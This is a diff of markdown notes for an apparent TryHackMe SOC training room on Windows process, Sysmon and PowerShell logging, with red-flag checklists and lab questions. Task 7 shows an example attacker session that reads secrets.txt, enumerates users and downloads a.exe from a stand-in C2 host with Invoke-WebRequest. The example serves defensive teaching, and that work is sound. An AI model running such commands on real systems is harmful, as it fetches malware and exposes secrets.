@@ -213,7 +213,8 @@ Above is an example of why SOC teams need more detailed logging than just authen
 | 4688 (Security Log: Process Creation) | Log an event every time a new process is launched, including its command line and parent process details | Disabled by default, you need to enable it by following the [official documentation](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/component-updates/command-line-process-auditing) |
 | 1 (Sysmon: Process Creation) | Replace 4688 event code and provide more advanced fields like process hash and its signature | Sysmon is an external tool not installed by default. Check out the Sysmon official page |
 
-Sysmon vs Security Log
+**Sysmon vs Security Log**
+
 Sysmon is a free tool from the Microsoft Sysinternals suite that became a de facto standard for advanced monitoring in addition to the default system logs. For this task, we'll jump right into analyzing Sysmon logs but you can learn more about this great tool in another TryHackMe room.
 
 So, if I were to choose between enabling the basic, noisy 4688 event ID or spending some time installing Sysmon to receive more powerful and flexible logs, I would proceed with Sysmon, and you are encouraged to do the same! Once installed, Sysmon logs are found in Event Viewer under Applications & Services -> Microsoft -> Windows -> Sysmon -> Operational.
@@ -222,38 +223,45 @@ So, if I were to choose between enabling the basic, noisy 4688 event ID or spend
 
 Comparison screenshot demonstrating the differences between 4688 and Sysmon 1 event IDs
 
-Sysmon Event ID 1 in Action
+**Sysmon Event ID 1 in Action**
+
 As you can see on the screenshot above, event ID 1 has a lot of different fields, the most important of which can be grouped as:
 
-Process Info: Context of the launched process, including its PID, path (image), and command line
-Parent Info: Context of the parent process, very useful to build a process tree or an attack chain
-Binary Info: Process hash, signature, and PE metadata. You will need it for more advanced rooms
-User Context: A user running the process and, most importantly, Logon ID - same as in the Security logs
+- **Process Info:** Context of the launched process, including its PID, path (image), and command line
+- **Parent Info:** Context of the parent process, very useful to build a process tree or an attack chain
+- **Binary Info:** Process hash, signature, and PE metadata. You will need it for more advanced rooms
+- **User Context:** A user running the process and, most importantly, Logon ID - same as in the Security logs.
+
 Since almost any attack works on the endpoint level and requires at least some process to be launched to breach the system or exfiltrate the data from it, process monitoring is the most important log source for any SOC team. Use the following workbook to perform a basic analysis of any process launch:
 
-Analyse Process Launch (Expand Me)
-Open Sysmon logs and filter for event ID 1
-Review the fields from the process and binary info groups. The red flags are:
-Image is in an uncommon directory like C:\Temp or C:\Users\Public
-Process is suspiciously named like aa.exe or jqyvpqldou.exe
-Process hash (MD5 or SHA256) matches as malware on VirusTotal
-Review the fields from the parent process group. The red flags are:
-Parent matches red flags from step 2 (suspicious name, path, or hash)
-Parent is not expected (e.g. Notepad launching some CMD commands)
-If still in doubt, go up the process tree until you are confident in your verdict:
-Find the preceding event where ProcessId equals ParentProcessId in your event
-Analyze it by following steps 2 and 3 (suspicious parent, name, path, or hash)
-Finally, trace the attack chain by filtering all Security and Sysmon events with the same Logon ID
-Answer the questions below
-Open the "Practice-Sysmon.evtx" file on the VM's Desktop.
-Which web browser does Sarah use to browse the web?
+**Analyse Process Launch:**
+
+1. Open Sysmon logs and filter for event ID 1
+2. Review the fields from the process and binary info groups. The red flags are:
+    - Image is in an uncommon directory like C:\Temp or C:\Users\Public
+    - Process is suspiciously named like aa.exe or jqyvpqldou.exe
+    - Process hash (MD5 or SHA256) matches as malware on VirusTotal
+3. Review the fields from the parent process group. The red flags are:
+    - Parent matches red flags from step 2 (suspicious name, path, or hash)
+    - Parent is not expected (e.g. Notepad launching some CMD commands)
+4. If still in doubt, go up the process tree until you are confident in your verdict:
+    - Find the preceding event where ProcessId equals ParentProcessId in your event
+    - Analyze it by following steps 2 and 3 (suspicious parent, name, path, or hash)
+5. Finally, trace the attack chain by filtering all Security and Sysmon events with the same Logon ID
+
+---
+
+- Answer the questions below
+
+    Open the "Practice-Sysmon.evtx" file on the VM's Desktop.
+    - Which web browser does Sarah use to browse the web?
 
 
-Which file did Sarah download from the browser?
+    - Which file did Sarah download from the browser?
 
 
-Which URL was the file downloaded from?
-Note: Use other Sysmon events to find out!
+    - Which URL was the file downloaded from?
+        Note: Use other Sysmon events to find out!
 
 
 
@@ -262,13 +270,50 @@ Note: Use other Sysmon events to find out!
 
 ## Task 6: Sysmon: Files and Network
 
+Overview
+As you have seen in the previous task, Sysmon can provide much more than just process creation events. It can log file and registry changes, network connections, DNS queries, and many other crucial events. Furthermore, you can configure what to log and what to skip, unlike with the default logs. This room, for example, uses a popular Florian's config, but you are free to change it to fit your needs. Let's take a look at four more event IDs:
+
+| Event ID | Security Log Alternative | Event Purpose |
+| --- | --- | --- |
+| 11 / 13 (File Create / Registry Value Set) | 4656 for file changes and 4657 for registry changes, both disabled by default | Detect files dropped by malware or its changes to the registry (e.g. for persistence) |
+| 3 / 22 (Network Connection / DNS Query) | No direct alternative, requires additional firewall and DNS configuration | Detect traffic from untrusted processes or to known malicious destinations |
+
+**Structure of Sysmon Events**
+
+![Structure of Sysmon Events](Screenshots/SysmonEvents.png)
+
+Take a look at the screenshot above - although every event ID has its own purpose, the fields highlighted in orange follow the same structure. Also, note that some critical fields, like Logon ID or parent process info, are missing. The logic here is that you use the ProcessId field to find the corresponding event ID 1 (Process Creation) and get the full context there.
+
+**Usage of Sysmon Events**
+
+Although process creation events provide enough context to detect common breach scenarios, additional logs can be vital to reconstruct the full attack chain and ensure nothing is missed. For example, you need network logs to identify where the data was `exfiltrated` to, and registry change logs to check which system configuration was modified by threat actors.
+
+**Analyse Process Activities:**
+
+1. Copy the ProcessId field from the event ID 1
+2. Search for other Sysmon events with the same ProcessId
+3. Your red flags for network connection events are:
+    - Connection to external IPs on port 80 or on non-standard ports like 4444
+    - Connection to known malicious IPs (e.g. by checking on VirusTotal)
+    - DNS queries to suspicious domains (*.top, *.click, or hpdaykfpadvsl.com)
+4. Your red flags for file and registry changes are:
+    - Files dropped to staging directories like C:\Temp or C:\Users\Public
+    - Dropped file is a script (.bat or .ps1) or an executable file (.exe or .com)
+    - Created files or registry keys are used for persistence (soon on it later!)
+
+---
+
+- Answer the questions below
+    Continue with the "Practice-Sysmon.evtx" file on the VM's Desktop.
+    
+    - Which file was created by the downloaded malware to persist on the host?
 
 
+    - What is the Command & Control server malware connected to?
+        (Answer in format IP:Port, e.g. 1.1.1.1:80)
 
 
-
-
-
+    - Finally, which domain does the malicious IP correspond to?
 
 
 ---
@@ -276,28 +321,72 @@ Note: Use other Sysmon events to find out!
 
 ## Task 7: PowerShell: Logging Commands
 
+**Overview**
+
+PowerShell is a powerful tool built into Windows that attackers love to abuse. Mainly because it is both trusted and capable of malware download, system discovery, data exfiltration, and even advanced techniques like process injection. However, you won't capture its commands by just using process creation logs like the Sysmon event ID 1. Take a look at the command prompt below:
 
 
+Commands Entered in PowerShell Terminal
+
+```PowerShell
+PS C:\> Get-ChildItem
+PS C:\> Get-Content secrets.txt
+PS C:\> Get-LocalUser; Get-LocalGroup
+PS C:\> Invoke-WebRequest http://c2server.thm/a.exe -OutPath C:\Temp\a.exe
+```
+
+Here, the threat actor managed to read a sensitive file, view local users and groups, and even download malware to the Temp directory. Still, you will see a single event ID 1 stating that powershell.exe was launched, with no information about the executed commands.
+
+**How It Works**
+
+Every program has a specific purpose: firefox.exe is a web browser, notepad.exe is a text editor, and whoami.exe simply outputs your username. If you're just browsing the web, you might only create a single Firefox process. However, with every out-of-scope task like RDP access or photo editing, you will have to open new programs and create additional logs.
+
+PowerShell, on the other hand, is a powerful all-in-one tool for managing the system. Once you launch powershell.exe, you can run hundreds of different commands within the same terminal session without creating new processes for each action. This is why Sysmon is not very helpful here, and you'll need to find an alternative logging approach.
+
+**PowerShell History File**
+
+There are at least five methods to monitor PowerShell, each with its own pros and cons. While you can check out the Logless Hunt room and research AMSI and Transcript Logging topics, in this room, we will focus on a simple but effective way to track PowerShell commands - the PowerShell history file:
+
+`C:\Users\<USER>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`
 
 
+The PowerShell history file is a plain text file automatically created by PowerShell. It simply records every command you type into a PowerShell window and is immediately updated when you press Enter to submit a command:
 
+Screenshot of PowerShell terminal with multiple entered commands, and a screenshot from the history file opened in Notepad showing that all commands were logged to the file
 
+![PowerShell History](Screenshots/PowerShellHistory.png)
 
+**Key Notes**
 
+The history file is very useful for tracking malicious actions like system discovery or malware download
+The history file is created for every user, meaning that you may see five files if there are five active system users
+It survives system reboots unless manually deleted and saves all PowerShell commands entered for all time
+It does not log command outputs and does not show script content (e.g. when running powershell .\script.ps1)
+
+---
+
+- Answer the questions below
+    - Review the Administrator's PS history on the attached VM.
+    Which PowerShell command was executed first?
+
+    - When did the Administrator run the first PS command? (Format: April 18, 2025)
+    Note: You might need to right-click the history file and open "Properties" to get the answer!
+
+    - Can you find the flag stored in the PowerShell history? (Format: THM{...})
+    Note: You might want to check the PS history of other local users!
 
 ---
 ---
 
 ## Task 8: Conclusion
 
+Congratulations on completing this room! By learning how to read and correlate logs from multiple sources, you are now better prepared to trace real attacks and detect the threat actors on every Cyber Kill Chain stage.
 
-
-
-
-
-
-
-
+Key Takeaways
+Know how to read 4624 and 4625 event IDs - you'll frequently encounter them in your SOC analyst role
+Group the logs by Logon ID and Process ID - a great way to quickly see the attack chain
+Learn Sysmon and make sure to use it - it gives you the most context about what's going on
+Don't forget about PowerShell logging - its usage in cyberattacks rapidly grows every year
 
 ---
 ---
